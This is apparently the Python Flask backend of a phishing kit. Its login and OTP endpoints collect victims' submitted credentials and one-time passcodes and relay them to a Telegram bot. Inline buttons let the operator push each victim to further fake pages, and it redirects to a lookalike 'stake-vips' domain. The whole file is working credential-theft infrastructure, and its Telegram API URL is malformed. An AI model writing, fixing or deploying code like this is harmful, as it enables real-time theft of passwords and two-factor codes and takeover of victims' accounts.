from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import uuid
import requests
import json
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)

# ✅ FULL CORS FIX FOR RENDER
CORS(app, resources={r"/*": {"origins": "*"}})

@app.after_request
def handle_options(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type,Authorization"
    response.headers["Access-Control-Allow-Methods"] = "GET,POST,OPTIONS"
    return response

# ENV
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID")

# SESSION STORE
SESSION_STATUS = {}

# ======================
# TELEGRAM SEND
# ======================
def send_to_telegram(data, session_id, type_):
    msg = f"🔐 {type_.upper()} Submission\n\n"
    for k, v in data.items():
        msg += f"• {k.upper()} : {v}\n"
    msg += f"\nSESSION: {session_id}"

    keyboard = {
        "inline_keyboard": [
            [{"text": "🔐 LOGIN1", "callback_data": f"{session_id}:index.html"}],
            [{"text": "🔢 OTP", "callback_data": f"{session_id}:otp.html"}],
            [{"text": "📧 EMAIL", "callback_data": f"{session_id}:email.html"}],
            [{"text": "🎉 DONE", "callback_data": f"{session_id}:thnks.html"}]
        ]
    }

    payload = {
        "chat_id": CHAT_ID,
        "text": msg,
        "reply_markup": json.dumps(keyboard)
    }

    r = requests.post(f"https://telegram.org{BOT_TOKEN}/sendMessage", data=payload)
    print(f"Telegram response ({type_}):", r.text) # Check this in Render Logs
    return r.ok

# ======================
# LOGIN
# ======================
@app.route("/login", methods=["POST", "OPTIONS"])
def login():
    if request.method == "OPTIONS": return jsonify({}), 200
    data = request.get_json()
    if not data: return jsonify({"success": False}), 400
    
    session_id = str(uuid.uuid4())
    SESSION_STATUS[session_id] = {"approved": False, "redirect_url": None}
    send_to_telegram(data, session_id, "login")
    return jsonify({"success": True, "id": session_id})

# ======================
# OTP (FIXED)
# ======================
@app.route("/otp", methods=["POST", "OPTIONS"])
def otp():
    if request.method == "OPTIONS": return jsonify({}), 200
    data = request.get_json()
    
    # ✅ FIX: Ensure backend is looking for the "otp" key your HTML sends
    if not data or "otp" not in data:
        return jsonify({"success": False, "error": "Missing OTP key"}), 400

    session_id = str(uuid.uuid4())
    SESSION_STATUS[session_id] = {"approved": False, "redirect_url": None}
    
    # ✅ Send to Telegram
    success = send_to_telegram(data, session_id, "otp")
    
    if success:
        return jsonify({"success": True, "id": session_id})
    return jsonify({"success": False, "error": "Telegram failed"}), 500

# ======================
# WEBHOOK & STATUS (Same as your original)
# ======================
@app.route("/status/<session_id>")
def status(session_id):
    session = SESSION_STATUS.get(session_id)
    if not session: return jsonify({"error": "Invalid session"}), 404
    return jsonify(session)

@app.route("/webhook", methods=["POST"])
def webhook():
    data = request.get_json()
    if "callback_query" in data:
        callback = data["callback_query"]
        msg_data = callback["data"]
        sid, page = msg_data.split(":")
        if sid in SESSION_STATUS:
            SESSION_STATUS[sid]["approved"] = True
            SESSION_STATUS[sid]["redirect_url"] = f"https://stake-vips.com{page}"
    return jsonify({"ok": True})

@app.route("/")
def home(): return "✅ Server is live"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
